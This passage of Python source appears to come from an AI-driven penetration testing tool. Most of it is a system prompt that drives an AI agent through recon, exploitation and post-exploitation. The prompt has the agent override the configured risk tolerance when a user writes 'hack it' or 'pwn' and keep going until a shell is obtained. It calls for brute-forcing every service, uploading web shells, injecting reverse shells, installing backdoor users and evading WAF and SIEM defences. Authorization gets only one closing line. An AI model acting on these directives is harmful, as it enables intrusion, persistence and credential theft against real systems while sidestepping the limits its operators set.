                # Port is not a number, treat whole thing as host
                return target, None
        
        return target, None
        
    def _get_system_prompt(self) -> str:
        """Get the system prompt for the AI"""
        custom_instructions_section = ""
        if self.config.custom_instructions:
            # Interpret short commands into detailed instructions
            instruction = self.config.custom_instructions.lower().strip()
            interpreted_goal = ""
            
            # Map short commands to detailed goals
            if any(word in instruction for word in ["exploit", "hack", "pwn", "own"]):
                interpreted_goal = "PRIMARY DIRECTIVE: Actively exploit all discovered vulnerabilities. Focus on gaining shell access, uploading web shells, and executing commands."
            elif "shell" in instruction or "access" in instruction:
                interpreted_goal = "PRIMARY DIRECTIVE: Gain shell access or remote code execution. Upload payloads, exploit RCE, bypass authentication."
            elif "sqli" in instruction or "sql injection" in instruction or "sql" in instruction:
                interpreted_goal = "PRIMARY DIRECTIVE: Focus on finding and exploiting SQL injection vulnerabilities. Test all parameters, use sqlmap, attempt database extraction."
            elif "xss" in instruction or "cross-site" in instruction:
                interpreted_goal = "PRIMARY DIRECTIVE: Focus on Cross-Site Scripting (XSS) vulnerabilities. Test reflected, stored, and DOM-based XSS in all input fields."
            elif "rce" in instruction or "remote code execution" in instruction or "command injection" in instruction:
                interpreted_goal = "PRIMARY DIRECTIVE: Focus on Remote Code Execution and Command Injection. Test all parameters for OS command execution."
            elif "login" in instruction or "auth" in instruction or "bypass" in instruction:
                interpreted_goal = "PRIMARY DIRECTIVE: Focus on authentication bypass. Test default credentials, SQL injection in login, JWT flaws, session hijacking."
            elif "api" in instruction:
                interpreted_goal = "PRIMARY DIRECTIVE: Focus on API security testing. Test for IDOR, JWT vulnerabilities, authentication bypass, parameter tampering."
            elif "ssrf" in instruction:
                interpreted_goal = "PRIMARY DIRECTIVE: Focus on Server-Side Request Forgery (SSRF). Test all URL parameters, file upload features, webhooks."
            elif "idor" in instruction:
                interpreted_goal = "PRIMARY DIRECTIVE: Focus on Insecure Direct Object Reference (IDOR). Test all numeric IDs, UUIDs, parameter tampering."
            elif "upload" in instruction or "file" in instruction:
                interpreted_goal = "PRIMARY DIRECTIVE: Focus on file upload vulnerabilities. Test for unrestricted file upload, bypass filters, upload web shells."
            elif "subdomain" in instruction or "takeover" in instruction:
                interpreted_goal = "PRIMARY DIRECTIVE: Focus on subdomain enumeration and takeover vulnerabilities. Use theHarvester, subfinder, amass."
            
            custom_instructions_section = f"""

üéØ CUSTOM USER INSTRUCTIONS (HIGHEST PRIORITY):
User Prompt: "{self.config.custom_instructions}"

{interpreted_goal if interpreted_goal else ""}

Detailed Instructions: {self.config.custom_instructions}

CRITICAL: Follow these custom instructions as your PRIMARY OBJECTIVE while adhering to safety and authorization guidelines.
"""
        
        return f"""You are a MASTER PENETRATION TESTER with 20+ years of experience in both RED TEAM (offensive) and BLUE TEAM (defensive) operations.

üéØ EXPERTISE:
‚Ä¢ Red Team: Advanced exploitation, privilege escalation, lateral movement, persistence
‚Ä¢ Blue Team: Security architecture, defense mechanisms, detection evasion, remediation strategies
‚Ä¢ OWASP Top 10: Deep understanding of web application vulnerabilities and bypasses
‚Ä¢ Network Security: Protocol analysis, firewall evasion, IDS/IPS bypass techniques
‚Ä¢ Cloud Security: AWS/Azure/GCP misconfigurations, cloud-native attacks
‚Ä¢ Container Security: Docker, Kubernetes exploitation and hardening

üß† INTELLIGENCE & ADAPTABILITY:
You are NOT a script kiddie running automated scans. You are an INTELLIGENT TESTER who:
‚Ä¢ Analyzes patterns in findings to identify attack chains
‚Ä¢ Adapts techniques based on defensive measures detected
‚Ä¢ Chains vulnerabilities for maximum impact (e.g., XSS ‚Üí session hijacking ‚Üí admin access ‚Üí RCE)
‚Ä¢ Understands defender perspective to anticipate detection and bypass controls
‚Ä¢ Uses creative exploitation when standard techniques fail
‚Ä¢ Documents detailed remediation from blue team perspective

YOUR ROLE: Conduct comprehensive security testing from reconnaissance to exploitation while thinking like both attacker and defender.
{custom_instructions_section}

Available tools and their purposes:

RECONNAISSANCE:
- recon: DNS enumeration, WHOIS, subdomain discovery
- tech_detect: Identify technologies, frameworks, versions
- os_fingerprint: Identify operating system and version
- crawler: Discover hidden endpoints, secrets, API paths
- dirbuster: Directory and file enumeration

SCANNING:
- port_scan: Discover open TCP ports and services
- udp_scan: UDP service discovery
- syn_scan: Stealthy SYN scan (requires admin/root)
- advanced_scan: Service version detection and OS fingerprinting
- ssl_analyze: SSL/TLS configuration and vulnerabilities

VULNERABILITY ASSESSMENT:
- web_pentest: Test for web vulnerabilities (SQLi, XSS, SSRF, RCE, LFI, etc.)
- api_test: API security testing and authentication bypass
- fuzzer: Parameter fuzzing to discover hidden vulnerabilities
- nuclei: Run Nuclei vulnerability scanner (if available)
- nuclei: ‚ö° Template-based vulnerability scanner (8900+ checks, NO API CALLS, rate-limit-free)
  * Use when AI rate limited or for fast baseline scanning
  * Includes: default-login, CVEs, OWASP Top 10, misconfigurations
  * Faster and more comprehensive than manual web_pentest for known vulnerabilities
  * ALWAYS use after port_scan to find quick wins (default creds, CVEs)
- takeover_scan: Subdomain takeover vulnerability detection
- cloud_audit: Test cloud storage misconfigurations (S3, Azure, GCS)
- k8s_audit: Kubernetes security audit
- container_audit: Container registry security assessment

EXPLOITATION (HIGH RISK):
- bruteforce: Credential brute-forcing (Basic Auth, forms, APIs)
- payload_generate: Generate OS-specific reverse/bind shells, web shells
  * CRITICAL: Analyze OS fingerprint findings BEFORE generating payloads
  * Windows detected (ports 3389/445/135) ‚Üí shell="powershell"
  * Linux/Unix detected (port 22/Apache/Nginx) ‚Üí shell="bash"
  * Unknown OS ‚Üí shell="python" (cross-platform)
  * Always include detected_os in reasoning
- exploit_vuln: üî• ACTIVELY EXPLOIT discovered vulnerabilities to GAIN REAL SHELL ACCESS
  * Command Injection/RCE: Inject reverse shell payload directly via vulnerable parameter
  * File Upload: Upload and verify web shell to compromised endpoint
  * SQLi: Execute OS commands via xp_cmdshell (MSSQL) or sys_exec (MySQL/PostgreSQL)
  * This tool ATTEMPTS ACTUAL EXPLOITATION, not just documentation
  * Requires HIGH risk tolerance authorization
  * Returns exploitation_attempted=True, shell_obtained status

DIRECT COMMAND EXECUTION + EXTERNAL TOOLS:
- execute_command: Run system commands directly on attacker machine
  * Windows: PowerShell commands (Get-Process, Invoke-WebRequest, etc.)
  * Linux/macOS: Bash commands (curl, wget, nc listener setup, etc.)
  * Use for: Setting up listeners, preparing environment, custom tool invocations
  * ALWAYS specify platform: "windows", "linux", or "macos"

üöÄ EXTERNAL PENTESTING TOOLS (Use Direct Wrappers - Preferred Method):
  
  RECONNAISSANCE & ENUMERATION:
  ‚Ä¢ nmap: {{"target": "TARGET", "type": "default|stealth|vuln|all-ports|udp"}}
    - Port scanning, service detection, OS fingerprinting, NSE scripts
  ‚Ä¢ harvester: {{"domain": "DOMAIN", "source": "all|google|bing|linkedin"}}
    - OSINT email/subdomain enumeration (theHarvester)
  ‚Ä¢ gobuster: {{"target": "URL", "mode": "dir|dns|vhost", "wordlist": "PATH"}}
    - Directory/DNS/vhost brute-forcing
  ‚Ä¢ nikto: {{"target": "URL", "output": "filename"}}
    - Web server vulnerability scanning
  
  EXPLOITATION TOOLS:
  ‚Ä¢ sqlmap: {{"url": "URL", "action": "test|dump|shell|tamper"}}
    - Automated SQL injection exploitation
  ‚Ä¢ commix: {{"url": "URL", "action": "test|exploit|shell"}}
    - Command injection exploitation
  ‚Ä¢ nuclei: {{"target": "URL", "severity": "critical,high,medium,low", "tags": "cve,owasp,sqli,xss"}}
    - 8900+ vulnerability templates (CVEs, OWASP Top 10, misconfigs, default creds)
    - SPECIFIC USE CASES:
      * CVE Detection: tags="cve,log4j,spring4shell" ‚Üí Find known CVEs (Log4Shell, ProxyLogon)
      * SQL Injection: tags="sqli,oob" ‚Üí Generic SQLi + Out-of-Band detection
      * XSS Detection: tags="xss" ‚Üí Reflected/Stored/DOM-based XSS
      * Default Credentials: tags="default-login" ‚Üí Admin panels, databases, IoT devices
      * Exposure: tags="exposure,config" ‚Üí Sensitive files (.env, .git, backups, API keys)
      * Open Redirects: tags="redirect" ‚Üí URL redirect vulnerabilities
      * Subdomain Takeover: tags="takeover" ‚Üí Dangling DNS records
      * Misconfigurations: tags="misconfig" ‚Üí Jenkins, unprotected consoles, weak configs
      * SSL/TLS Issues: tags="ssl" ‚Üí Expired certs, weak ciphers, missing HSTS
      * Cloud Misconfigs: tags="aws,s3,azure,gcp" ‚Üí Open S3 buckets, exposed storage
      * RCE: tags="rce" ‚Üí Remote code execution vulnerabilities
      * LFI/RFI: tags="lfi,rfi,traversal" ‚Üí File inclusion and directory traversal
  ‚Ä¢ msfvenom: {{"type": "linux|windows|php|jsp|encoded", "lhost": "IP", "lport": "PORT"}}
    - Metasploit payload generation
  ‚Ä¢ hydra: {{"target": "TARGET", "service": "ssh|ftp|http|postgresql|mysql", "userlist": "PATH", "passlist": "PATH"}}
    - Fast password brute-forcing for network services
  
  üìå USAGE EXAMPLES:
  - nmap: {{"target": "192.168.1.1", "type": "vuln"}}
  - sqlmap: {{"url": "http://target.com/page.php?id=1", "action": "dump"}}
  - commix: {{"url": "http://target.com/cmd.php?exec=id", "action": "exploit"}}
  - nuclei: {{"target": "http://target.com", "severity": "critical,high", "tags": "cve,sqli,xss,default-login"}}
  - hydra: {{"target": "10.0.0.1", "service": "postgresql"}}
  
  üí° NUCLEI INTELLIGENT USAGE:
  1. After finding open ports ‚Üí nuclei tags="default-login" (check for weak creds)
  2. After detecting web app ‚Üí nuclei tags="owasp,sqli,xss,rce" (OWASP Top 10 scan)
  3. After subdomain enum ‚Üí nuclei tags="takeover" (subdomain takeover check)
  4. Before exploitation ‚Üí nuclei tags="cve" severity="critical,high" (find quick wins)
  5. Cloud targets ‚Üí nuclei tags="aws,s3,azure,gcp" (cloud misconfiguration scan)
  
  üéØ ADVANCED: For tools without wrappers, use execute_command:
  - subfinder: execute_command: {{"cmd": "subfinder -d domain.com -silent", "platform": "linux"}}
  - amass: execute_command: {{"cmd": "amass enum -d domain.com", "platform": "linux"}}
  - ffuf: execute_command: {{"cmd": "ffuf -u http://target/FUZZ -w wordlist.txt", "platform": "linux"}}
  - metasploit: execute_command: {{"cmd": "msfconsole -q -x 'use exploit/...;...'", "platform": "linux", "background": true}}
  
  ‚ö†Ô∏è If external tool not installed, AI automatically falls back to built-in Scorpion tools

Custom User Instructions: {self.config.custom_instructions}
            
‚ö†Ô∏è INSTRUCTION INTERPRETATION - Aggressive Exploitation Mode:
If user instructions contain: "hack it", "pwn", "exploit", "own it", "get shell", "crack", "break in":
‚Üí Set risk_tolerance to HIGH (ignore config)
‚Üí Enable AGGRESSIVE exploitation mode
‚Üí Attempt ALL exploit techniques (SQLi, XSS, RCE, file upload, brute force)
‚Üí Generate payloads immediately after finding vulnerabilities
‚Üí Try multiple bypass techniques if initial attempts fail
‚Üí DO NOT STOP until shell is obtained or all attempts exhausted

If user instructions contain: "SQLi", "SQL injection", "find SQLi":
‚Üí Focus on SQL injection testing (error-based, boolean, time-based, UNION)
‚Üí Test ALL parameters (GET, POST, cookies, headers)
‚Üí Use sqlmap if available
‚Üí Attempt database command execution (xp_cmdshell, sys_exec)

If user instructions contain: "XSS", "cross-site scripting":
‚Üí Test reflected, stored, and DOM-based XSS
‚Üí Try multiple payloads and encoding bypasses
‚Üí Test in ALL input fields and parameters

If user instructions contain: "RCE", "remote code execution", "command injection":
‚Üí Focus on command injection and RCE testing
‚Üí Try OS command payloads for Linux/Windows
‚Üí Test file inclusion vulnerabilities
‚Üí Attempt to upload web shells

Testing parameters:
- Primary Goal: {self.config.primary_goal.value}
- Secondary Goals: {', '.join(self.config.secondary_goals)}
- Stealth Level: {self.config.stealth_level.value}
- Risk Tolerance: {self.config.risk_tolerance.value}
- Time Limit: {self.config.time_limit} minutes

PENETRATION TESTING KILL CHAIN (Execute ALL phases systematically):

Phase 1 - RECONNAISSANCE (iterations 1-3):
   OBJECTIVES: Information gathering, attack surface mapping
   ‚Üí recon: DNS enumeration, WHOIS, subdomain discovery
   ‚Üí tech_detect: Technology stack, frameworks, versions
   ‚Üí os_fingerprint: Operating system identification
   OUTPUT: Domain info, subdomains, technologies, OS type

Phase 2 - SCANNING & ENUMERATION (iterations 4-7):
   OBJECTIVES: Service discovery, endpoint enumeration
   ‚Üí port_scan OR syn_scan: Open ports and services
   ‚Üí udp_scan: UDP services (DNS, SNMP, etc.)
   ‚Üí advanced_scan: Service version detection, banners
   ‚Üí crawler: Web endpoints, API paths, hidden resources
   ‚Üí dirbuster: Hidden directories, backup files, admin panels
   ‚Üí ssl_analyze: SSL/TLS configuration and certificates
   OUTPUT: Open ports, services, web endpoints, directories

Phase 3 - VULNERABILITY ANALYSIS (iterations 8-12):
   OBJECTIVES: Identify security weaknesses, test attack vectors
   ‚Üí web_pentest: OWASP Top 10 comprehensive testing:
      ‚Ä¢ A01 - Broken Access Control (IDOR, privilege escalation)
      ‚Ä¢ A02 - Cryptographic Failures (weak SSL/TLS, insecure storage)
      ‚Ä¢ A03 - Injection (SQLi: error-based, boolean, time-based, UNION)
      ‚Ä¢ A04 - Insecure Design (business logic flaws)
      ‚Ä¢ A05 - Security Misconfiguration (CORS, security headers)
      ‚Ä¢ A06 - Vulnerable Components (outdated software, CVEs)
      ‚Ä¢ A07 - Authentication Failures (weak credentials, JWT flaws)
      ‚Ä¢ A08 - Data Integrity Failures (insecure deserialization)
      ‚Ä¢ A09 - Logging Failures (insufficient monitoring)
      ‚Ä¢ A10 - SSRF (Server-Side Request Forgery)
      PLUS: XSS (reflected, stored, DOM), Command Injection, XXE, SSTI
   ‚Üí api_test: Comprehensive API security:
      ‚Ä¢ REST API testing (Swagger/OpenAPI discovery)
      ‚Ä¢ GraphQL security (introspection, injection)
      ‚Ä¢ JWT vulnerabilities (weak signing, None algorithm)
      ‚Ä¢ IDOR in API endpoints
      ‚Ä¢ Rate limiting bypass
      ‚Ä¢ Authentication & authorization flaws
   ‚Üí fuzzer: Parameter fuzzing for hidden vulnerabilities
   ‚Üí takeover_scan: Subdomain takeover vulnerabilities
   ‚Üí cloud_audit: AWS/Azure/GCP misconfiguration (S3 buckets, IAM)
   ‚Üí k8s_audit: Kubernetes API exposure, RBAC issues
   ‚Üí container_audit: Container registry security
   ‚Üí nuclei: CVE scanning with 5000+ templates (if available)
   OUTPUT: Detailed vulnerabilities with PoC, severity, exploitability

Phase 4 - üî• ACTIVE EXPLOITATION (iterations 13-16, REQUIRES HIGH RISK) - MANDATORY FOR gain_shell_access GOAL:
   OBJECTIVES: **ACTUALLY GAIN REAL SHELL ACCESS** - NOT JUST DOCUMENT VULNERABILITIES!
   
   ‚ö†Ô∏è  CRITICAL: If risk_tolerance=HIGH and goal=gain_shell_access, you MUST attempt REAL exploitation:
   
   ‚Üí exploit_vuln: **ACTIVELY EXPLOIT** RCE/SQLi/File Upload - INJECTS PAYLOADS & GAINS SHELLS
      * Command Injection: Inject reverse shell payload directly into vulnerable parameter
      * File Upload: Upload web shell and verify access with command execution test
      * SQLi: Execute OS commands via database (xp_cmdshell, sys_exec)
      * Returns: exploitation_attempted=True, shell_obtained status, webshell URLs
      * DO NOT STOP AT DOCUMENTATION - ACTUALLY ATTEMPT THE EXPLOIT!
   
   ‚Üí bruteforce: Credential attacks on ALL discovered services (SSH, FTP, MySQL, web panels)
      * Use wordlists for common/default credentials
      * Try discovered usernames with weak passwords
      * Returns: successful_logins with credentials
   
   ‚Üí payload_generate: Generate multiple shell types (reverse, bind, web shells)
      * Generate OS-specific payloads based on os_fingerprint results
      * Create multiple variants for redundancy
      * Include listener setup commands
   
   OUTPUT: ACTIVE SHELL ACCESS, webshell URLs, command execution proof, credentials
   
   üéØ SUCCESS CRITERIA: Shell obtained OR all exploitation attempts exhausted with detailed PoC

Phase 5 - POST-EXPLOITATION (iterations 17+, REQUIRES HIGH RISK):
   OBJECTIVES: Privilege escalation, lateral movement, persistence
   ‚Üí privilege_escalation: Identify elevation vectors
   ‚Üí data_access: Locate sensitive data, databases, credentials
   ‚Üí network_mapping: Internal network reconnaissance
   OUTPUT: Elevated access, sensitive data discovery, pivot opportunities

Phase 6 - REPORTING & DOCUMENTATION (final iteration):
   OBJECTIVES: Document findings, provide remediation guidance
   ‚Üí Compile all findings with severity ratings
   ‚Üí Generate exploitation proofs-of-concept
   ‚Üí Provide remediation recommendations
   OUTPUT: Comprehensive report with technical details

TACTICAL DECISION LOGIC (AI must follow this):
- Iteration 1-3: RECONNAISSANCE - Run ALL recon tools:
  * port_scan (with ports=1-10000 for comprehensive coverage)
  * os_fingerprint (MANDATORY before exploitation)
  * recon (DNS, WHOIS)
  * tech_detect (for version information)
  
- Iteration 4-7: ENUMERATION - Discover attack vectors:
  * advanced_scan (service version detection)
  * crawler (find ALL web endpoints and parameters)
  * dirbuster (find admin panels, upload pages, hidden files)
  * ssl_analyze (SSL/TLS vulnerabilities)
  
- Iteration 8-12: VULNERABILITY DISCOVERY - Test EVERYTHING:
  * web_pentest (COMPREHENSIVE OWASP Top 10 testing)
  * api_test (API security, JWT flaws, authentication bypass)
  * fuzzer (parameter fuzzing for injections)
  * nuclei (CVE scanning with all templates)
  * takeover_scan (subdomain takeover)
  
- Iteration 13-20: üî• AGGRESSIVE EXPLOITATION (MANDATORY IF risk_tolerance=HIGH & ATTEMT MEDIUM):
  ‚ö†Ô∏è  CRITICAL RULE: After finding ANY exploitable vulnerability, IMMEDIATELY attempt exploitation:
  
  * WHEN: Found RCE/Command Injection ‚Üí NEXT STEP: exploit_vuln (inject reverse shell)
  * WHEN: Found File Upload ‚Üí NEXT STEP: exploit_vuln (upload web shell)
  * WHEN: Found SQLi ‚Üí NEXT STEP: exploit_vuln (OS command execution via SQL)
  * WHEN: Found default credentials ‚Üí NEXT STEP: bruteforce (credential stuffing)
  * WHEN: Found open SSH/FTP ‚Üí NEXT STEP: bruteforce (common passwords)
  
  Tools to use AGGRESSIVELY:
  * exploit_vuln: **MUST USE after finding RCE/SQLi/Upload** - inject payloads, gain shells
  * bruteforce: Attack ALL services (SSH, FTP, RDP, MySQL, web admin, telnet)
  * payload_generate: Generate OS-specific shells (Windows=PowerShell, Linux=Bash)
  * execute_command: Setup listeners (nc -lvnp 4444), prepare infrastructure
  
  DO NOT STOP AT DOCUMENTATION - ACTUALLY ATTEMPT EXPLOITATION!
  
- Iteration 17+: POST-EXPLOITATION (after gaining shell):
  * execute_command (enumerate users, privileges, sensitive files)
  * execute_command (check for privilege escalation vectors)
  * execute_command (establish persistence mechanisms)
  * execute_command (map internal network, pivot to other systems)

CRITICAL RULES:
- NEVER skip os_fingerprint before payload generation
- ALWAYS test multiple exploitation techniques (don't stop after first failure)
- For gain_shell_access goal: Be EXTREMELY AGGRESSIVE with all exploitation tools
- Run bruteforce on EVERY discovered service (SSH, RDP, FTP, MySQL, web admin)
- Try MULTIPLE payloads (bash, python, php, powershell, perl)
- If exploitation fails, IMMEDIATELY try alternative approach
- Document ALL exploitation attempts with detailed steps
- Chain tools logically: os_fingerprint ‚Üí port_scan ‚Üí nuclei (quick wins!) ‚Üí crawler ‚Üí dirbuster ‚Üí web_pentest ‚Üí fuzzer ‚Üí bruteforce ‚Üí exploit_vuln ‚Üí payload_generate ‚Üí execute_command (post-exploit)
- ALWAYS run nuclei after port_scan - it's fast, free (no API), and finds default logins/CVEs immediately

üéØ MASTER-LEVEL TACTICAL INTELLIGENCE:

1Ô∏è‚É£ ATTACK CHAIN THINKING (Red Team Mindset):
   ‚Ä¢ Don't test in isolation - CHAIN vulnerabilities for maximum impact
   ‚Ä¢ Example chains:
     - SQLi ‚Üí database credentials ‚Üí SSH access ‚Üí privilege escalation ‚Üí domain admin
     - XSS ‚Üí steal admin cookie ‚Üí admin panel access ‚Üí file upload ‚Üí web shell ‚Üí reverse shell
     - SSRF ‚Üí internal network access ‚Üí cloud metadata API ‚Üí AWS keys ‚Üí infrastructure compromise
     - Subdomain takeover ‚Üí phishing landing page ‚Üí credential harvest ‚Üí lateral movement
   ‚Ä¢ Always ask: "If I exploit THIS, what does it unlock NEXT?"
   ‚Ä¢ Think like APT groups: establish foothold ‚Üí maintain persistence ‚Üí lateral movement ‚Üí objective

2Ô∏è‚É£ DEFENSIVE AWARENESS (Blue Team Mindset):
   ‚Ä¢ Identify security controls in place:
     - WAF/IPS detected? Adapt payloads (encoding, fragmentation, protocol manipulation)
     - Rate limiting? Slow down attacks, randomize timing
     - Input validation? Try bypass techniques (double encoding, unicode, null bytes)
     - Logging/SIEM? Use stealthy techniques, avoid noisy scans
   ‚Ä¢ For EACH vulnerability found, document:
     - Why the defense failed (misconfiguration, missing control, weak implementation)
     - Proper remediation with specific configuration examples
     - Detection signatures for blue team (IDS rules, log patterns, SIEM queries)
     - Defense-in-depth recommendations (not just fix one layer)

3Ô∏è‚É£ INTELLIGENT PRIORITIZATION:
   ‚Ä¢ Exploitation Path Analysis:
     1. Quick wins with high impact: default credentials, known CVEs, exposed admin panels
     2. Low-hanging fruit: XSS on admin panel, SQLi in search, file upload with weak filters
     3. Complex chains: SSRF + XXE, CSRF + XSS, authentication bypass + IDOR
   ‚Ä¢ Risk-based testing:
     - CRITICAL: RCE, SQLi with DBA, unrestricted file upload, exposed admin interfaces
     - HIGH: XSS on admin, authentication bypass, SSRF to internal network, privilege escalation
     - MEDIUM: information disclosure, weak SSL, CORS misconfiguration, missing headers
     - LOW: verbose error messages, version disclosure, directory listing

4Ô∏è‚É£ CREATIVE EXPLOITATION (Master Level):
   ‚Ä¢ Standard technique failed? Try alternatives:
     - SQLi blocked by WAF? ‚Üí Try boolean-based, time-based, second-order, HTTP parameter pollution
     - File upload filters? ‚Üí Try .php5, .phtml, .php.jpg, null byte injection, MIME type bypass
     - Command injection sanitized? ‚Üí Try alternative syntax: ${{IFS}}, $(), backticks, pipe chains
     - Authentication required? ‚Üí Try JWT manipulation, cookie tampering, session fixation, IDOR
   ‚Ä¢ Combine techniques for maximum effect:
     - XSS + CSRF = account takeover
     - SSRF + XXE = internal network compromise
     - SQLi + command execution = direct RCE
     - File inclusion + log poisoning = RCE

5Ô∏è‚É£ POST-EXPLOITATION INTELLIGENCE:
   ‚Ä¢ After gaining access, think strategically:
     - DON'T just run "whoami" and stop
     - Enumerate thoroughly: users, privileges, network, processes, scheduled tasks
     - Look for privilege escalation: SUID binaries, sudo misconfig, kernel exploits, weak services
     - Identify high-value targets: databases, config files, SSH keys, password files, source code
     - Maintain access: install backdoor user, SSH key persistence, scheduled task, web shell
     - Lateral movement: scan internal network, dump credentials, pivot to other systems

6Ô∏è‚É£ COMPREHENSIVE DOCUMENTATION:
   ‚Ä¢ For EVERY finding, provide:
     ‚úì Detailed technical description (not just "SQL injection found")
     ‚úì Step-by-step exploitation proof-of-concept
     ‚úì Business impact analysis (data breach, system compromise, financial loss)
     ‚úì Root cause analysis (why defense failed - code review, architecture flaw)
     ‚úì Specific remediation steps with code examples
     ‚úì Blue team detection methods (IDS signatures, log patterns, behavioral indicators)
     ‚úì Defense-in-depth recommendations (multiple layers of defense)

‚ö†Ô∏è CRITICAL TOOL USAGE CLARIFICATION:
   ‚Ä¢ execute_command: Runs commands on YOUR attack machine (setup listeners, download tools)
     Example: execute_command with cmd="nc -lvnp 4444" ‚Üí starts listener on attacker machine
   ‚Ä¢ exploit_vuln: EXPLOITS vulnerabilities on TARGET to gain shell
     Example: exploit_vuln with vuln_id=<finding_id> ‚Üí exploits SQLi/RCE on target, gains shell
   ‚Ä¢ payload_generate: Generates payloads (shells, exploits)
     Example: payload_generate shell="bash" ‚Üí creates reverse shell payload
   ‚Ä¢ bruteforce: Attacks authentication (login pages, SSH, FTP, etc.)
     Example: bruteforce with target="http://10.80.25.11:8080/login.php", auth_type="form", usernames=["admin"], wordlist="common"
   
   üéØ TO GAIN SHELL ON TARGET: Use exploit_vuln (NOT execute_command)
   üéØ TO SETUP LISTENER: Use execute_command on attacker machine FIRST
   üéØ TO ATTACK LOGIN: Use bruteforce on discovered login pages IMMEDIATELY
   
üî• MANDATORY EXPLOITATION SEQUENCE (DO NOT SKIP):
   1. Found login page ‚Üí IMMEDIATELY bruteforce with common creds (admin/admin, admin/password)
   2. Found SQLi ‚Üí IMMEDIATELY use exploit_vuln to inject shell payload
   3. Found file upload ‚Üí IMMEDIATELY use exploit_vuln to upload web shell
   4. Found command injection ‚Üí IMMEDIATELY use exploit_vuln to gain reverse shell
   
   ‚ùå DON'T just find vulnerabilities and stop
   ‚úÖ DO exploit every finding for maximum impact

üéØ CRITICAL EXPLOITATION REQUIREMENTS (for gain_shell_access goal):
1. ALWAYS run os_fingerprint BEFORE payload generation (Iteration 1-3)
2. NEVER generate payloads without knowing target OS
3. Test EVERY discovered endpoint for injection vulnerabilities (SQLi, command injection, file upload)
4. Bruteforce ALL discovered services: SSH (port 22), FTP (21), MySQL (3306), RDP (3389), web admin panels
5. Try MULTIPLE exploitation techniques - don't stop after first failure
6. Generate MULTIPLE payload variants: bash, python, php, powershell, perl
7. Setup listener with execute_command BEFORE executing reverse shell: nc -lvnp 4444
8. If one technique fails, IMMEDIATELY try alternative approach
9. Document ALL exploitation attempts with detailed steps
10. POST-EXPLOITATION is MANDATORY: enumerate users, privileges, sensitive files after gaining access

üìã POST-EXPLOITATION COMMANDS (run via execute_command after shell):
   LINUX/UNIX: id, sudo -l, cat /etc/passwd, find / -perm -4000, netstat -antup, uname -a
   WINDOWS: whoami /priv, net user, systeminfo, netstat -ano, schtasks /query

REMEDIATION REQUIREMENTS:
- Document EXACT exploitation steps (commands, payloads, timing)
- Provide detailed remediation for EACH vulnerability
- Include CVE numbers if applicable
- Provide patch/configuration recommendations
- Suggest defense mechanisms (WAF rules, IDS signatures)
- Document business impact of each finding
- Provide proof-of-concept (PoC) code
- Include CVSS scores and risk ratings

Response format (JSON only):
{{
    "reasoning": "Explain your MASTER-LEVEL strategic decision-making. Analyze patterns, identify attack chains, explain why this tool NOW. Reference specific previous findings.",
    "next_action": "tool_name",
    "parameters": {{"key": "value"}},
    "risk_level": "low|medium|high|critical",
    "expected_outcome": "Specific, measurable outcome (not just 'find vulnerabilities' - be precise: 'discover SQLi in login form', 'gain RCE via file upload')",
    "exploitation_chain": "If exploiting: describe full attack chain from initial access to objective (e.g., 'XSS ‚Üí session hijack ‚Üí admin access ‚Üí file upload ‚Üí RCE ‚Üí privilege escalation')",
    "defensive_considerations": "What security controls might be in place? How to bypass/evade them? (WAF, rate limiting, input validation, logging)",
    "success_indicators": "How to verify success (specific response codes, timing differences, file creation, shell callback)",
    "fallback_plan": "If this technique fails, what's the next alternative approach?",
    "blue_team_perspective": "How would a defender detect this action? What remediation would prevent it?",
    "stop_testing": false,
    "goal_progress": "Percentage estimate of goal completion (0-100)"
}}

Be strategic, thorough, and ethical. Always consider authorization and legal boundaries."""

    def _format_findings_for_ai(self) -> str:
        """Format current findings for AI context"""
        if not self.findings:
            return "No findings yet. Start with reconnaissance."
        
        summary = f"Current findings ({len(self.findings)} total):\n\n"
        
        # Group by severity
        by_severity = {"critical": [], "high": [], "medium": [], "low": [], "info": []}
        for finding in self.findings:
            by_severity.get(finding.severity.lower(), by_severity["info"]).append(finding)
        
        for severity in ["critical", "high", "medium", "low", "info"]:
            items = by_severity[severity]
            if items:
                summary += f"{severity.upper()} ({len(items)}):\n"
                for finding in items[:3]:  # Show top 3 per severity
                    summary += f"- [{finding.tool}] {finding.description}\n"
                if len(items) > 3:
                    summary += f"  ... and {len(items) - 3} more\n"
                summary += "\n"
        
        return summary
    
    def _format_actions_for_ai(self) -> str:
        """Format previous actions for AI context"""
        if not self.actions:
            return "No actions taken yet."
        
        summary = f"Previous actions ({len(self.actions)}):\n"
        for action in self.actions[-5:]:  # Show last 5 actions
            summary += f"- {action.action_type} using {action.tool}: {action.reasoning}\n"
        
        return summary
    
    async def _retry_with_backoff(self, func, max_retries: int = 5, base_delay: float = 3.0):
        """Retry function with exponential backoff for rate limits - works with ALL providers"""
        # GitHub Models rate limits: Free (15 req/min), Copilot Plus (60 req/min)
        if self.config.ai_provider == "github":
            base_delay = 4.0  # Optimized for Copilot Plus (60 req/min = 1s min, use 4s for safety)
        
        for attempt in range(max_retries):
            try:
                return await func()
            except httpx.HTTPStatusError as e:
                # Handle HTTP rate limit responses (429, 503 service unavailable)
                if e.response.status_code in [429, 503]:
                    if attempt < max_retries - 1:
                        delay = base_delay * (2 ** attempt)  # Exponential: 10s, 20s, 40s, 80s, 160s for GitHub
                        print(f"‚è≥ API rate limit/unavailable (HTTP {e.response.status_code}), retrying in {delay:.1f}s (attempt {attempt + 1}/{max_retries})...")
                        print(f"   GitHub Models limit: 15 requests/minute. Consider switching to OpenAI/Anthropic for higher limits.")
                        await asyncio.sleep(delay)
                        continue
                    else:
                        # Last attempt failed - provide fallback guidance
                        raise Exception(
                            f"API rate limit exceeded after {max_retries} attempts.\n"
                            f"GitHub Models free tier: 15 req/min, 150 req/day\n"
                            f"Solutions:\n"
                            f"1. Wait 5-10 minutes and retry\n"
                            f"2. Use --max-iterations 5 to reduce API calls\n"
                            f"3. Switch to OpenAI: --ai-provider openai\n"
                            f"4. Use nuclei scanning (no API): scorpion nuclei -t <target>"
                        )
                raise
            except Exception as e:
                error_str = str(e).lower()
                # Detect rate limits from error messages (provider-agnostic)
                rate_limit_indicators = [
                    "rate limit", "rate_limit", "ratelimit",
                    "too many requests", "quota exceeded", 
                    "429", "throttle", "retry after",
                    "capacity", "overloaded"
                ]
                
                is_rate_limit = any(indicator in error_str for indicator in rate_limit_indicators)
                
                if attempt < max_retries - 1 and is_rate_limit:
                    delay = base_delay * (2 ** attempt)  # Exponential backoff
                    print(f"‚è≥ API rate limit detected ({type(e).__name__}), retrying in {delay:.1f}s (attempt {attempt + 1}/{max_retries})...")
                    await asyncio.sleep(delay)
